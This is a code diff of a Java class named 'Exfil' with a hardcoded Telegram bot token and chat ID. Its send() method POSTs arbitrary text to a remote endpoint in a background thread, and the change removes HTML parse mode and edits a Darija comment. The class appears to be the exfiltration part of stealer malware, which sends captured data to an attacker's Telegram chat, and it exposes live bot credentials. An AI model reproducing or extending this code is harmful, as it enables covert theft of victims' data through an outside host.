@@ -13,7 +13,7 @@ public class Exfil {
     public static final String BOT_TOKEN = "8624726401:AAF0OfA_I0vxNPkeEucmLFCU6CBff7ynbUk"; 
     public static final String CHAT_ID = "8431994335"; 
 
-    // 1. Send Text (Kaykhdem b Thread bach maycrashich)
+    // 1. Send Text (Thread bach maycrashich, bla HTML bach Markdown ykhdem)
     public static void send(String text) {
         new Thread(() -> {
             try {
@@ -22,7 +22,7 @@ public class Exfil {
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
-                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML";
+                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(postData.getBytes());
                 }
